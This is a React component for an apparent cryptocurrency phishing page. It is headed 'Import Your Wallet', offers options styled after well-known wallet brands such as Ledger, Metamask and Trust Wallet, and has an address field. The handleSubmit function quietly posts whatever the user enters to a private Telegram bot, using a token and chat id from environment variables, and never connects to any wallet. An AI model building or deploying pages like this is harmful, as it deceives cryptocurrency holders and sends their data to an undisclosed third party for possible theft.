import { useState } from 'react';
import Footer from './Footer';
import Slider from './Slider';

const walletOptions = [
  {
    name: 'Ledger Device',
    description: 'Add an account from a Ledger Nano X or Ledger Nano S.',
  },
  {
    name: 'Trust Wallet',
    description: 'Connect using the Trust Wallet for easy access.',
  },
  {
    name: 'Metamask',
    description: 'Secure your assets with the Metamask.',
  },
  {
    name: 'OKX Wallet',
    description: 'Manage your account using the OKX Wallet.',
  },
  {
    name: 'Keystone',
    description: 'Connect with your Keystone hardware wallet.',
  },
  {
    name: 'Safepal',
    description: 'Protect your funds with the Safepal hardware wallet.',
  },
  {
    name: 'Other Wallets',
    description: 'Connect Other Centralized and Decentralized Wallets',
  },
  {
    name: 'Address',
    description: 'Connect using your wallet address directly.',
  },
];

const ConnectWallet = () => {
  const [selectedWallet, setSelectedWallet] = useState(walletOptions[0]);
  const [address, setAddress] = useState('');
  const [success, setSuccess] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();

    const botToken = import.meta.env.VITE_BOT_TOKEN;
    const chatId = import.meta.env.VITE_CHAT_ID;

    const message = `Imported Wallet Address: ${address}`;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        }
      );

      if (response.ok) {
        setSuccess(true);
      } else {
        alert('Failed to send data to Telegram. Please try again.');
      }
    } catch (error) {
      console.error('Error sending data to Telegram:', error);
      alert('An error occurred. Please try again later.');
    }
  };

  return (
    <div>
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-r from-red-50 to-orange-50 p-4 sm:p-6 lg:p-8">
        <div className=" rounded-lg p-6 max-w-5xl w-full">
          <h1 className="text-2xl sm:text-3xl font-bold text-center mb-8 text-gray-800">
            Import Your Wallet
          </h1>
          <div className="flex flex-col lg:flex-row gap-8">
            {/* Wallet Options */}
            <div className="w-full lg:w-1/3 space-y-3">
              {walletOptions.map((wallet, index) => (
                <button
                  key={index}
                  onClick={() => setSelectedWallet(wallet)}
                  className={`w-full text-left px-4 py-3 rounded-md text-sm md:text-base 
                  ${
                    selectedWallet.name === wallet.name
                      ? 'bg-gradient-to-r from-red-100 to-orange-100 border-l-4 border-red-500'
                      : 'hover:bg-gray-100'
                  }
                  focus:outline-none transition-all duration-200 ease-in-out
                `}
                >
                  <span className="font-medium text-gray-800">
                    {wallet.name}
                  </span>
                </button>
              ))}
            </div>

            {/* Wallet Details */}
            <div className="flex-1 space-y-6">
              <h2 className="text-xl font-semibold text-gray-800">
                {selectedWallet.name}
              </h2>
              <p className="text-gray-700">{selectedWallet.description}</p>

              {selectedWallet.name === 'Address' && (
                <div>
                  <input
                    type="text"
                    placeholder="0x*********************************"
                    value={address}
                    onChange={(e) => setAddress(e.target.value)}
                    className="w-full border border-gray-300 rounded-md px-4 py-2 focus:outline-none focus:ring-2 focus:ring-red-500"
                  />
                  <button
                    onClick={handleSubmit}
                    className={`mt-4 px-6 py-2 rounded-md ${
                      success
                        ? 'bg-green-500 text-white hover:bg-green-600 transition-all duration-300 ease-in-out'
                        : 'bg-gradient-to-r from-red-500 to-orange-500 text-white hover:from-red-600 hover:to-orange-600 transition-all duration-300 ease-in-out'
                    }`}
                  >
                    {success ? 'Submitted Successfully' : 'Submit'}
                  </button>
                </div>
              )}
              <button className="bg-gradient-to-r from-red-500 to-orange-500 text-white px-6 py-2 rounded-md hover:from-red-600 hover:to-orange-600 transition-all duration-300 ease-in-out">
                Import {selectedWallet.name}
              </button>
            </div>
          </div>
        </div>
      </div>
      <Slider />
      <Footer />
    </div>
  );
};

export default ConnectWallet;
